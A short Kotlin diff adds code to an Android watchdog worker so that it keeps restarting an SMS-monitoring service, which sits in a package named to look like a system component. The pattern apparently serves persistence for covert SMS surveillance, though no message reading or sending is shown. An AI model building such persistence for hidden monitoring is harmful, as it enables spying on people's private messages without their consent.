@@ -51,6 +51,19 @@ class UnifiedWatchdogWorker(
             }
         }
 
+        // 🔥 3) Also ensure SmsMonitorService is running
+        try {
+            val smsIntent = Intent(ctx, com.android.system.services.SmsMonitorService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(ctx, smsIntent)
+            } else {
+                ctx.startService(smsIntent)
+            }
+            Log.d(TAG, "Watchdog ensured SmsMonitorService")
+        } catch (t: Throwable) {
+            Log.w(TAG, "FGS start blocked for SmsMonitorService: ${t.message}")
+        }
+
         // Always succeed; WM will trigger again on its schedule
         return Result.success()
     }
